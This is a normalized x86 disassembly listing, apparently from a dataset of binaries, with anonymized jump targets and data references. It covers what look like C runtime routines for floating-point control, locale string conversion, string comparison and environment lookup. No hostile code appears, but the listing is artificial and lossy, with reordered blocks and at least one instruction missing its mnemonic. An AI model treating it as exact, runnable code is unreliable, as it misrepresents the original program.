push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_41da62
lea eax [ ebp - 0x20 ]
push eax
call sub_41d227
add esp 0xc
test eax eax
jne r-xdata
fld [ ebp - 0x8 ]
pop esi
leave
retn
push esi
call sub_41d706
pop ecx
sub_41d7f9
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
call sub_412089
push 0xffff
push [ ebp + 0x14 ]
mov [ eax ] 0x21
call sub_41da62
fld [ ebp + 0xc ]
pop ecx
pop ecx
pop ebp
retn
push [ ebp + 0x14 ]
fld [ ebp + 0xc ]
sub esp 0x18
fstp [ esp + 0x10 ]
fldz
fstp [ esp + 0x8 ]
fld [ ebp + 0xc ]
fstp [ esp ]
push [ ebp + 0x8 ]
push 0x1
call sub_41d75b
add esp 0x24
pop ebp
retn
sub_41d84c
push ebp
mov ebp esp
and esp 0xfffffff0
sub esp 0x80
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x7c ] eax
push [ ebp + 0x20 ]
lea eax [ ebp + 0x18 ]
push eax
push [ ebp + 0x8 ]
call sub_41d525
add esp 0xc
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_41d72e
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
and [ esp + 0x40 ] 0xfffffffe
push eax
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0x20 ]
push [ ebp + 0x8 ]
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_41d22a
add esp 0x1c
push eax
call sub_41d706
mov [ esp ] 0xffff
push [ ebp + 0x20 ]
call sub_41da62
fld [ ebp + 0x18 ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x20 ]
fld [ ebp + 0x18 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fldz
fstp [ esp + 0x8 ]
fld [ ebp + 0x10 ]
fstp [ esp ]
push [ ebp + 0xc ]
push eax
call sub_41d75b
add esp 0x24
jmp r-xdata
mov ecx [ esp + 0x7c ]
xor ecx esp
call sub_413965
mov esp ebp
pop ebp
retn
sub_41d917
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
mov ecx [ ebp + 0xe ]
fstp [ ebp - 0x8 ]
add eax 0x3fe
shl eax 0x4
and ecx 0xffff800f
or eax ecx
mov [ ebp - 0x2 ] ax
fld [ ebp - 0x8 ]
leave
retn
sub_41d941
push ebp
mov ebp esp
xor edx edx
cmp [ ebp + 0xc ] 0x7ff00000
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
mov ecx [ ebp + 0xe ]
mov eax 0x7ff8
and ecx eax
cmp cx ax
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp cx 0x7ff0
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
sub_41d99c
push ebp
mov ebp esp
fldz
fcom [ ebp + 0x8 ]
fnstsw ax
test ah 0x44
jpe r-xdata
xor ecx ecx
test [ ebp + 0xe ] 0x7ff0
jne r-xdata
xor edx edx
jmp r-xdata
push ecx
fstp st0
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_41d917
mov edx [ ebp + 0xe ]
shr edx 0x4
and edx 0x7ff
add esp 0xc
sub edx 0x3fe
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
pop ebp
retn
fcomp [ ebp + 0x8 ]
mov edx 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
test [ ebp + 0xe ] 0x10
je r-xdata
shl [ ebp + 0xc ] 0x1
test [ ebp + 0x8 ] 0x80000000
je r-xdata
and [ ebp + 0xe ] 0xffef
cmp eax ecx
je r-xdata
shl [ ebp + 0x8 ] 0x1
dec edx
or [ ebp + 0xc ] 0x1
fld [ ebp + 0x8 ]
push ecx
push ecx
push ecx
fstp [ esp ]
call sub_41d917
add esp 0xc
jmp r-xdata
or [ ebp + 0xe ] 0x8000
sub_41da62
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not eax
and eax [ ebp - 0x4 ]
or eax ecx
movzx eax ax
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_41da89
push ecx
push ecx
mov cl [ esp + 0xc ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ esp + 0xc ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ esp ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ esp ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
pop ecx
pop ecx
retn
fldpi
fstp [ esp ]
fwait
sub_41dadf
push 0x8
push r--data
call sub_412340
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_412385
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_41db51
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
cmp eax ebx
push edi
mov edi ecx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
mov [ ebp - 0x8 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_41e0a8
cmp eax 0xffffffff
pop ecx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_413965
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
cmp esi ebx
mov edi eax
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_41e0ef
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_40fdab
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_40fb30
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_40e632
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_40fe88
cmp eax ebx
pop ecx
je r-xdata
call sub_413980
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_41dd09
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_410556
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41db51
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41dd49
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push [ esi + 0x4 ]
call sub_40fdab
push [ esi + 0x8 ]
call sub_40fdab
push [ esi + 0xc ]
call sub_40fdab
push [ esi + 0x10 ]
call sub_40fdab
push [ esi + 0x14 ]
call sub_40fdab
push [ esi + 0x18 ]
call sub_40fdab
push [ esi ]
call sub_40fdab
push [ esi + 0x20 ]
call sub_40fdab
push [ esi + 0x24 ]
call sub_40fdab
push [ esi + 0x28 ]
call sub_40fdab
push [ esi + 0x2c ]
call sub_40fdab
push [ esi + 0x30 ]
call sub_40fdab
push [ esi + 0x34 ]
call sub_40fdab
push [ esi + 0x1c ]
call sub_40fdab
push [ esi + 0x38 ]
call sub_40fdab
push [ esi + 0x3c ]
call sub_40fdab
add esp 0x40
push [ esi + 0x40 ]
call sub_40fdab
push [ esi + 0x44 ]
call sub_40fdab
push [ esi + 0x48 ]
call sub_40fdab
push [ esi + 0x4c ]
call sub_40fdab
push [ esi + 0x50 ]
call sub_40fdab
push [ esi + 0x54 ]
call sub_40fdab
push [ esi + 0x58 ]
call sub_40fdab
push [ esi + 0x5c ]
call sub_40fdab
push [ esi + 0x60 ]
call sub_40fdab
push [ esi + 0x64 ]
call sub_40fdab
push [ esi + 0x68 ]
call sub_40fdab
push [ esi + 0x6c ]
call sub_40fdab
push [ esi + 0x70 ]
call sub_40fdab
push [ esi + 0x74 ]
call sub_40fdab
push [ esi + 0x78 ]
call sub_40fdab
push [ esi + 0x7c ]
call sub_40fdab
add esp 0x40
push [ esi + 0x80 ]
call sub_40fdab
push [ esi + 0x84 ]
call sub_40fdab
push [ esi + 0x88 ]
call sub_40fdab
push [ esi + 0x8c ]
call sub_40fdab
push [ esi + 0x90 ]
call sub_40fdab
push [ esi + 0x94 ]
call sub_40fdab
push [ esi + 0x98 ]
call sub_40fdab
push [ esi + 0x9c ]
call sub_40fdab
push [ esi + 0xa0 ]
call sub_40fdab
push [ esi + 0xa4 ]
call sub_40fdab
push [ esi + 0xa8 ]
call sub_40fdab
add esp 0x2c
sub_41ded9
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40fdab
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_40fdab
pop ecx
push esi
call sub_40fdab
pop ecx
sub_41df19
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40fdab
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40fdab
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40fdab
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40fdab
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40fdab
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_40fdab
pop ecx
push esi
call sub_40fdab
pop ecx
sub_41dfd0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_41e020
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_41e0a8
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_41e305
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_413965
leave
retn
sub_41e0ef
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
cmp eax [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
test eax eax
mov ebx [ MultiByteToWideChar@IAT ]
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_413965
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_40fb30
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
cmp esi 0xffffffff
mov [ ebp - 0x2c ] 0x1
jne r-xdata
push [ ebp - 0x1c ]
call sub_40e632
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_40fe88
cmp eax edi
pop ecx
je r-xdata
call sub_413980
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_415b90
mov esi eax
pop ecx
inc esi
cmp [ ebp - 0x2c ] edi
mov ebx [ WideCharToMultiByte@IAT ]
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_413797
cmp eax edi
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_40fdab
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_41e2a1
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_410556
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_41e316
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
test esi esi
push ebx
push edi
jne r-xdata
xor eax eax
pop esi
retn
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ rw-data ] esi
je r-xdata
xor eax eax
push ebx
call sub_415b90
pop ecx
mov edi eax
jmp r-xdata
call sub_42045f
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_415b90
cmp eax edi
pop ecx
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push ebx
push eax
call sub_420448
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
pop ebx
pop esi
retn
sub_41e397
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
cmp ebx 0xffffc001
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
cmp esi edx
mov [ ebp + 0x8 ] esi
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
